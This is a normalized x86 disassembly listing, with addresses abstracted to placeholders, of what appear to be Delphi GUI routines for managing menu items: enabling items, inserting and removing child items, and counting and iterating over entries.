mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_44ea18
push eax
call EnableMenuItem
sub_450428
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_4507e8
mov edx eax
mov ecx ebx
mov eax edi
call sub_44e9b8
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_450314
sub_450494
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_413a74
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_44dac0
sub_450504
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_450484
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_4504ec
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_45081c
mov ecx ebx
mov edx esi
mov eax edi
call sub_450610
sub_45054c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_450484
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_450494
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_4505a4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_450484
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_450494
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_450494
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_450610
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_44dac0
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_44e9b8
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_413af0
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_450888
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_450484
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44e8e8
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_413a74
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_413a74
mov dl [ eax + 0x3f ]
mov eax esi
call sub_450428
sub_4506c4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_44dac0
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_450484
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44e8e8
mov eax ebx
call sub_450484
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_413a74
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_413964
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_450738
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_45035c
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_45046c
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_45046c
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_450800
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_450484
mov edx eax
mov ecx esi
mov eax ebx
call sub_450610
pop esi
pop ebx
retn
sub_45081c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4507e8
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_4506c4
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_44dac0
sub_450844
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_450888
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_450888
jmp r-xdata
mov eax ebx
call sub_44e8e8
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_452560
sub_4508e0
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42168c
mov [ ebx + 0x4c ] eax
sub_450908
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_403290
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_450b9c
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_40348c
mov edx ebx
mov eax edi
call sub_4194fc
mov eax ebx
mov si 0xffee
call sub_40348c
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_450978
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42168c
mov [ esi + 0x4c ] eax
sub_4509ac
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_450484
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_450494
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_4509ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_45081c
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_450800
jmp r-xdata
mov edx ebx
mov eax esi
call sub_450800
sub_450a50
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_450314
sub_450a7c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_4502ec
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_45035c
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_4503b0
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_404034
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_4504dc
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_450428
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_4504b8
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_4504cc
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_450b9c
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_45046c
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_40348c
sub_450bc0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450be0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450c00
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450c20
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450c40
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450c60
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450c80
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450ca0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450cc0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_450ce0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414114
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_44ab30
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_44ac68
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_44acc8
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_44a9c8
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_44ad88
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_450d58
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419748
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45046c
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_450908
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_450dac
jmp r-xdata
xor edx edx
mov eax esi
call sub_44e870
sub_450dac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_44c244
mov eax ebx
call sub_450e1c
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_44c288
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_4194fc
sub_450df4
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_450df4
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_44df44
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_450888
mov eax ebx
pop esi
pop ebx
retn
sub_450e30
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c0f4
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_404540
sub_450e60
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_404078
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_450ee4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_451006
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_4042a0
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_4042a0
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_404500
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4043ec
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45100d
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404004
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_404588
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_404360
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_4042a0
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_404500
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_404360
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_451044
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_4514e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_404078
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4514a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_450484
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_404078
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4514ea
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_404004
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_404004
lea eax [ ebp - 0x18 ]
call sub_403fe0
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
mov eax ebx
call sub_451698
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_450494
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4043ec
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_450e60
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_450494
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_450494
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403290
mov eax [ ebp - 0x20 ]
call sub_403290
mov eax [ ebp - 0x14 ]
call sub_403290
mov eax [ ebp - 0xc ]
call sub_403290
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_450e60
pop ecx
mov eax [ ebp - 0x30 ]
call sub_4042a0
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_450494
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_452f3c
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407bc8
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_404034
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c0f4
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c0f4
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_450494
push eax
mov edx esi
mov eax ebx
call sub_450494
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_404500
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407bc8
push ebp
mov eax [ ebp - 0x2c ]
call sub_450e30
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_450e30
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c0f4
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_404078
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_450494
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_450494
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_452ea8
mov edx [ ebp - 0x40 ]
pop eax
call sub_404034
mov edx esi
mov eax ebx
call sub_450494
push eax
mov edx esi
mov eax ebx
call sub_450494
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_4042a0
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_404500
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_450ee4
mov eax [ ebp - 0x18 ]
call sub_4042a0
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_404540
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_404588
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_450ee4
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_451540
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_450484
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_450484
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
